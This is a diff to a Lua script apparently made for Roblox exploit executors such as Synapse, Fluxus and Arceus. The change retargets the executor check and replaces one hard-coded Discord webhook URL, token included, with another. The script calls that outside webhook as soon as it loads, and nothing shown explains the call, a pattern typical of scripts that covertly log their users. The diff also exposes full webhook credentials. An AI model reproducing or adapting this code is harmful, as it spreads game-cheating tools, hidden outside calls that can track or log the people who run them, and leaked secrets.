@@ -9,11 +9,11 @@ repeat
 until game.Players.LocalPlayer
 wait(5)
 LoadedUiHub = false
-local b = syn and syn.request or identifyexecutor() == "Fluxus" and request or http_request or requests
+local b = syn and syn.request or identifyexecutor() == "Arceus" and request or http_request or requests
 local d =
     b(
     {
-        Url = "https://discord.com/api/webhooks/1099304603918544957/4Pj0WLsbxYH1BAf7x4rvkM80QRhd95fODHJcT9238C2S5aG9xOoE0vnEOW_MATAQ9Dn8"
+        Url = "https://discord.com/api/webhooks/1264868047089434685/9KyDBxxQMPv7pLSr0gnEj3WF9Oa_BtQjj0vAz83nhQbNe-ANesRgt9kxLFKUUzPeSMqf"
     }
 )
 
